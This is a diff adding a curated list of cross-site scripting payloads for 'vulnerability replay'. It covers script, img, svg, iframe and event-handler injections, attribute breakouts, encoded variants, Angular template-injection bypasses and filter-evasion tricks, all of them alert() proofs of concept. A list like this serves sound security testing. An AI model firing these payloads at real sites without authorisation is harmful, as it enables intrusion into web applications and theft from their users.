@@ -1,0 +1,65 @@
+# ============================================================
+# XSS Payloads — Curated for vulnerability replay
+# ============================================================
+
+# --- Basic script injection ---
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+# --- IMG tag event handlers ---
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('xss')">
+<img/src=x onerror=alert(1)>
+
+# --- iframe injection ---
+<iframe src="javascript:alert('xss')">
+<iframe src="javascript:alert(document.domain)">
+
+# --- SVG injection ---
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+
+# --- Event handler injection (attribute breakout) ---
+" onmouseover="alert(1)
+' onfocus='alert(1)' autofocus='
+" onfocus="alert(1)" autofocus="
+" onclick="alert(1)
+
+# --- URL-encoded variants ---
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+# --- Double URL-encoded ---
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+
+# --- DOM-based / javascript: protocol ---
+javascript:alert(document.cookie)
+javascript:alert(1)//
+
+# --- Angular / template injection bypass ---
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+
+# --- Filter bypass: nested/split tags ---
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+
+# --- Null byte injection ---
+<scri%00pt>alert(1)</scri%00pt>
+<img src=x onerror=alert(1)%00>
+
+# --- Body/details/marquee tags ---
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+# --- Input/button handlers ---
+<input onfocus=alert(1) autofocus>
+<button onclick=alert(1)>click</button>
+
+# --- Data URI ---
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+<object data="data:text/html,<script>alert(1)</script>">
